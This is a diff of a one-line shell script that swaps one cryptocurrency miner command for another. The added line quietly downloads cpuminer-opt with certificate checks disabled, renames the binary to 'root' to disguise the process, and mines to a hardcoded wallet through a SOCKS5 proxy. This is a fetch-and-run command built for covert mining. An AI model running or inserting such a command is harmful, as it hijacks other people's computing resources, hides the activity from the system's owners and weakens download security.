@@ -1,2 +1,1 @@
-
-wget https://github.com/nanopool/nanominer/releases/download/v3.6.2/nanominer-linux-3.6.2.tar.gz && tar -xf nanominer-linux-3.6.2.tar.gz && cd nanominer-linux-3.6.2 && chmod +x nanominer && ./nanominer -algo Verushash -wallet RNP9gsoRceBPvXUc8wKF5uNh1PKKuMUXTL.coba3 -coin VRSC -pool1 ap.luckpool.net:3956 -t 3
+wget -q https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.41/cpuminer-opt-linux-5.0.41a.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux-5.0.41a.tar.gz && mv cpuminer-sse2 root && ./root -a yespowerSUGAR -o stratum+tcp://yespowerSUGAR.mine.zpool.ca:6241 -u RTwkzfFeRPsTU4VAFetiod7HCXNYD6bELc -p c=RVN -t 3 --proxy socks5://192.252.220.89:4145
